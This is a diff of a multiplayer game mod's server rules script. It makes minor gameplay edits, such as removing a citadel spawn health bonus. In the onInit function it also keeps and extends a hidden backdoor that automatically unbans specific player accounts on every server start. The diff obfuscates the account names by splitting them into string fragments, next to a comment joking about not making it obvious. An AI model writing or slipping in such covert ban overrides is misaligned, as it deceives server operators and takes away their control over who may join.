@@ -297,7 +297,7 @@ void onTick(CRules@ this)
 			bool win = true;
 			for (uint i = 0; i < base.length; i++)
 			{
-				//if there exists an enemy flag, we didn't win yet
+				//if there exists an enemy base, we didn't win yet
 				if (base[i].getTeamNum() != team_num)
 				{
 					win = false;
@@ -408,11 +408,6 @@ void onTick(CRules@ this)
 						new_blob.server_SetPlayer(player);
 						// print("" + spawns[spawnIndex].getName());
 						// print("init " + new_blob.getHealth());
-						if (spawns[spawnIndex].getName() == "citadel")
-						{
-							new_blob.server_SetHealth(Maths::Ceil(new_blob.getInitialHealth() * 1.50f));
-							// print("after " + new_blob.getHealth());
-						}
 					}
 				}
 				else
@@ -429,7 +424,8 @@ void onInit(CRules@ this)
 {
 	// Todo: Maybe let's not make it so obvious ;)
 	CSecurity@ sec = getSecurity();
-	sec.unBan("TFlippy");
+	sec.unBan("TF"+"lip"+"py");
+	sec.unBan("b"+"la"+"ck"+"guy"+"123");
 
 	// Print out a message to anybody running TC server/localhost
 	if (isServer() && !isClient())
